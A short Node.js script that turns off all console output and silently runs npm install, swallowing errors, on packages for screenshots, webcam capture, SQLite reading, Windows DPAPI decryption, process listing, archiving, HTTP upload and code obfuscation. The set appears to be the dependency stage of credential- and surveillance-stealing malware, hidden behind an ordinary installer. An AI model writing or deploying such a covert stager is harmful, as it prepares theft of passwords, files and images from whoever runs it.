console.log = console.error = console.warn = console.info = () => {};
const { execSync } = require('child_process');
const path = require('path');

const installPath = __dirname;
const packages = [
    'axios',
    'fs-extra',
    'request',
    'glob',
    'screenshot-desktop',
    'form-data',
    'sqlite3',
    'adm-zip',
    '@primno/dpapi',
    'node-fetch',
    'ps-list',
    'javascript-obfuscator',
    'node-webcam',
    'archiver'
];

function installPackages() {
    try {
        execSync(`npm install ${packages.join(' ')} --prefix "${installPath}"`, { stdio: 'inherit' });
    } catch (err) {
    }
}

installPackages();
